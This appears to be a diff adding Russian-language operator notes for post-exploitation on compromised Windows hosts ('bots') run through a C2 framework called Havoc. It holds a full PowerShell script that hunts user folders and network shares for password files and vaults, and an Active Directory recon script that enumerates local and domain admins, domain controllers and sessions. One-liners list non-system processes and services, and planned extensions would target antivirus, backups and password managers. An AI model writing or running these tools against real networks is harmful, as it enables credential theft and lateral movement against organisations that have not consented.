@@ -1,0 +1,275 @@
+Быстрый поиск паролей-на боте чтоб по фасту чекнуть мб у юзера есть креды от акка, еще откуда,часто бывает пароли в файлах хранят
+Быстрый сбор инфы-в хавок одной коммандой,чтоб картину по боту получить быструю
+Однострочные комманды-аналогично, но в разные комманды по необходимости
+можешь тестануть если все ОК в 1 файл упаковать, типо fast_command info(Быстрый сбор инфы-) fast_command pass (Быстрый поиск паролей) fast_command ad_users,ad_comps fast_command proc fast_command services
+fast_command можно расширять по ходу работы
+добавить так же процессы по паттернам-ав,бэкапы,браузеры,менеджеры паролей,ssh/ftp клиенты,почтовые клиенты
+fast_command av,fast_command backups,fast_command soft(браузеры,менеджеры паролей,ssh/ftp клиенты,почтовые клиенты) и тд
+к тому же с твоим автодополнением круто работать будет
+вводишь fast_command и тебе предлагает варианты pass,ad_users,soft и тд с кратким описанием
+
+
+
+
+
+
+
+СКРИПТ ДЛЯ ПАРОЛЕЙ 
+
+
+PowerShell скрипт для поиска паролей (расширение + паттерн имени, путь через аргументы):
+
+```powershell
+param(
+    [Parameter(Mandatory=$false)]
+    [string]$Path
+)
+
+# Auto-detect user home directory if Path not specified
+if (-not $Path) {
+    $Path = $env:USERPROFILE
+    Write-Host "[*] Path not specified, using current user home: $Path" -ForegroundColor Cyan
+}
+
+# Validate path exists
+if (-not (Test-Path $Path)) {
+    Write-Host "[!] Error: Path does not exist: $Path" -ForegroundColor Red
+    exit 1
+}
+
+$extensions = @("*.txt", "*.xls", "*.csv", "*.xml", "*.xlsx", "*.doc", "*.rtf", "*.docx", "*.ini", "*.config", "*.psafe3", "*.kdbx")
+
+# Auto-detect system language
+$systemLang = (Get-Culture).TwoLetterISOLanguageName
+
+# Password patterns per language (minimal set, no duplicates)
+$languagePatterns = @{
+    "en" = @("pass", "secret", "cred", "pwd")
+    "fr" = @("pass", "motdepasse", "secret", "identifiant", "mdp")
+    "es" = @("pass", "contraseña", "contrasena", "clave", "secreto", "credencial")
+    "de" = @("pass", "kennwort", "geheim", "anmeldedaten", "zugang")
+    "it" = @("pass", "parola", "segreto", "credenzial", "accesso")
+    "pt" = @("pass", "senha", "palavra-passe", "segredo", "credencia", "acesso")
+}
+
+# Select patterns (fallback to English)
+if ($languagePatterns.ContainsKey($systemLang)) {
+    $patterns = $languagePatterns[$systemLang]
+    Write-Host "[*] System language detected: $systemLang" -ForegroundColor Yellow
+} else {
+    $patterns = $languagePatterns["en"]
+    Write-Host "[*] System language: $systemLang (unknown, using English patterns)" -ForegroundColor Yellow
+}
+
+Write-Host "[*] Searching for files by name in: $Path" -ForegroundColor Cyan
+Write-Host "[*] Extensions: $($extensions -join ', ')" -ForegroundColor Gray
+Write-Host "[*] Patterns: $($patterns -join ', ')" -ForegroundColor Gray
+Write-Host ""
+
+$count = 0
+
+# Search by filename only
+foreach ($ext in $extensions) {
+    Get-ChildItem -Path $Path -Filter $ext -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+        $fileName = $_.Name
+        $filePath = $_.FullName
+        
+        # Case-insensitive filename check
+        foreach ($pattern in $patterns) {
+            if ($fileName -match [regex]::Escape($pattern)) {
+                Write-Host "[+] $filePath" -ForegroundColor Green
+                $count++
+                break
+            }
+        }
+    }
+}
+
+Write-Host ""
+Write-Host "[*] Search completed. Found $count files" -ForegroundColor Cyan
+```
+
+**Использование:**
+```powershell
+.\find_passwords.ps1 -Path C:\Users\
+.\find_passwords.ps1 -Path \\server\share\
+
+# Silent output to file
+.\find_passwords.ps1 -Path C:\Users\ > results.txt 2>&1
+
+```
+
+**Что делает:**
+Поиск по имени файлов независимо от регистра, достаточно вжождения, не полные строки
+Если аргумент Path не задан ищет от корня текущего пользователя
+
+
+
+
+
+
+
+
+
+
+СБОР ИНФЫ 
+
+
+
+
+
+
+```powershell
+# Quick AD host recon script
+
+# Helper: parse systeminfo field
+function Get-SysField($lines, $key, $default) {
+    $m = @($lines | Select-String $key)[0]
+    if ($m) { $m.Line.Split(":",2)[1].Trim() } else { $default }
+}
+
+# Helper: parse net group output
+function Get-NetGroupMembers($cmd) {
+    $out = Invoke-Expression "$cmd 2>&1" | Select-Object -Skip 4 | Select-Object -SkipLast 2 | Where-Object { $_.Trim() -ne "" }
+    if ($out) { $out | ForEach-Object { Write-Host "  $_" } }
+}
+
+# Helper: print section with Format-Table
+function Show-Section($title, $data) {
+    if ($data -and $data.Count -gt 0) {
+        Write-Host "`n--- $title ---" -ForegroundColor Cyan
+        $data | Format-Table -AutoSize
+    }
+}
+
+# Collect system info
+$sysinfo = systeminfo 2>&1
+$hostname     = Get-SysField $sysinfo "Host Name:"           $env:COMPUTERNAME
+$osName       = Get-SysField $sysinfo "OS Name:"             "Unknown"
+$manufacturer = Get-SysField $sysinfo "System Manufacturer:" "Unknown"
+$domainName   = Get-SysField $sysinfo "Domain:"              "WORKGROUP"
+$inDomain     = $domainName -ne "WORKGROUP" -and $domainName -ne "Unknown"
+
+# Collect network info
+$ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" } | ForEach-Object {
+    [PSCustomObject]@{ IP = $_.IPAddress; Interface = (Get-NetAdapter -InterfaceIndex $_.InterfaceIndex).Name }
+}
+
+# Collect listening ports (top 10)
+$connections = Get-NetTCPConnection -State Listen | Select-Object -First 10 | ForEach-Object {
+    [PSCustomObject]@{
+        Port = $_.LocalPort; PID = $_.OwningProcess
+        Process = (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName
+    }
+} | Sort-Object Port
+
+# Collect sessions
+$sessions = @()
+query session 2>$null | Select-Object -Skip 1 | ForEach-Object {
+    if ($_ -match '^\s*>?\s*(\S+)\s+(\S+)?\s+(\d+)\s+(\S+)') {
+        $sessions += [PSCustomObject]@{
+            Session = $matches[1]; User = if ($matches[2]) { $matches[2] } else { "-" }
+            ID = $matches[3]; State = $matches[4]
+        }
+    }
+}
+
+# Output report
+Write-Host ""
+Write-Host "====================================================================" -ForegroundColor Cyan
+Write-Host "                     SYSTEM INFORMATION                             " -ForegroundColor Cyan
+Write-Host "====================================================================" -ForegroundColor Cyan
+Write-Host "`nHostname      : $hostname"
+Write-Host "OS            : $osName"
+Write-Host "Manufacturer  : $manufacturer"
+$domainColor = if ($inDomain) { "Green" } else { "Gray" }
+Write-Host "Domain        : $domainName" -ForegroundColor $domainColor
+
+Show-Section "Network Interfaces"      $ipAddresses
+Show-Section "Active Sessions"         $sessions
+Show-Section "Listening Ports (Top 10)" $connections
+
+# Local admins (always shown)
+Write-Host "`n--- Local Administrators ---" -ForegroundColor Cyan
+Get-NetGroupMembers "net localgroup administrators"
+
+# Domain enumeration (only if in domain)
+if ($inDomain) {
+    Write-Host "`n--- Domain Admins ---" -ForegroundColor Cyan
+    Get-NetGroupMembers 'net group "Domain Admins" /domain'
+
+    Write-Host "`n--- Domain Controllers ---" -ForegroundColor Cyan
+    Get-NetGroupMembers 'net group "Domain Controllers" /domain'
+
+    Write-Host "`n--- Domain Statistics ---" -ForegroundColor Cyan
+    try {
+        $di = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+        Write-Host "  Domain    : $($di.Name)" -ForegroundColor Green
+        try {
+            Import-Module ActiveDirectory -ErrorAction Stop
+            $cc = (Get-ADComputer -Filter *).Count
+            $uc = (Get-ADUser -Filter *).Count
+        } catch {
+            $s = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"")
+            $s.PageSize = 1000
+            $s.Filter = "(objectCategory=computer)"; $r = $s.FindAll(); $cc = $r.Count; $r.Dispose()
+            $s.Filter = "(&(objectCategory=person)(objectClass=user))"; $r = $s.FindAll(); $uc = $r.Count; $r.Dispose()
+            $s.Dispose()
+        }
+        Write-Host "  Computers : $cc"
+        Write-Host "  Users     : $uc"
+    } catch {
+        Write-Host "  Unable to query domain" -ForegroundColor Red
+    }
+} else {
+    Write-Host ""
+    Write-Host "! Host is not in domain - skipping AD enumeration" -ForegroundColor DarkGray
+}
+
+Write-Host ""
+
+```
+
+
+
+
+
+
+
+
+И ЕЩЕ 
+
+
+
+
+
+
+Получить только не системные процессы
+
+```powershell
+Get-Process | Where-Object { $_.Path -ne $null -and $_.Path -notlike "C:\Windows\System32\*" } | Select-Object Id, ProcessName, Path
+```
+
+Список только не системных сервисов
+
+```powershell
+Get-WmiObject Win32_Service | Where-Object { $_.State -eq "Running" -and $_.PathName -notlike "*Windows\system32\*" -and $_.PathName -notlike "*Windows\SysWOW64\*" } | Select-Object Name, DisplayName, PathName, StartName | Format-List
+```
+
+
+ Количество компьютеров в домене
+
+```powershell
+([ADSISearcher]"(objectCategory=computer)").FindAll().Count
+```
+
+ Количество пользователей в домене
+
+```powershell
+([ADSISearcher]"(&(objectCategory=person)(objectClass=user))").FindAll().Count
+```
+
+
+
+
+
